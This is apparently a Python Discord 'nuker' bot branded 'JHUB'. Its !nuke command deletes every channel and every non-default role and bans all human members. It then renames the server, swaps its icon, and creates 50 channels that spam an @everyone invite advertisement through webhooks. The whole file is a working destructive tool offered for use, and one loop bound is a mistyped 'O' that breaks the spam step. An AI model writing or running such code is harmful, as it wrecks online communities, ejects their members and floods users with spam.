import discord
from discord.ext import commands
import os
import aiohttp
import asyncio

# Configuration
prefix = "!"
channel_name = "nuked-by-jhub"
webhook_name = "JHUB ON TOP"
webhook_pfp = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2b8458d4f1cfb539b5cb03c.gif?size=96"
spam_message = "@everyone JHUB ON TOP  discord.gg/k7dfvnK7KK"
guild_name = "JHUB ON TOP"
guild_icon = "https://cdn.discordapp.com/icons/1122953623325595789/a_26a40cc1a2b8458d4f1cfb539b5cb03c.gif?size=96"

# Bot setup
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=prefix, intents=intents)

# Events
@bot.event
async def on_ready():
    print(f"✅ {bot.user} is online and ready.")

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    # Delete channels
    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Failed to delete channel {channel.name}: {e}")

    # Delete roles (except @everyone)
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
            except Exception as e:
                print(f"Failed to delete role {role.name}: {e}")

    # Ban members (except bots)
    for member in guild.members:
        if not member.bot:
            try:
                await member.ban(reason="Nuked by JHUB")
            except Exception as e:
                print(f"Failed to ban {member.name}: {e}")

    # Rename server and change icon
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(guild_icon) as resp:
                if resp.status == 200:
                    icon_data = await resp.read()
                    await guild.edit(name=guild_name, icon=icon_data)
    except Exception as e:
        print(f"Failed to change guild icon: {e}")

    # Create spam channels and spam via webhooks
    for i in range(50):
        try:
            channel = await guild.create_text_channel(f"{channel_name}-{i}")
            webhook = await channel.create_webhook(name=webhook_name)
            for _ in range(O):  # Reduce spam to avoid API abuse
                try:
                    await webhook.send(spam_message, username=webhook_name, avatar_url=webhook_pfp)
                except Exception as e:
                    print(f"Webhook spam failed: {e}")
        except Exception as e:
            print(f"Failed to create channel or webhook: {e}")

# Run bot
if __name__ == "__main__":
    token = os.getenv("DISCORD_TOKEN")
    if not token:
        print("❌ Error: DISCORD_TOKEN environment variable not found.")
        exit(1)
    bot.run(token)
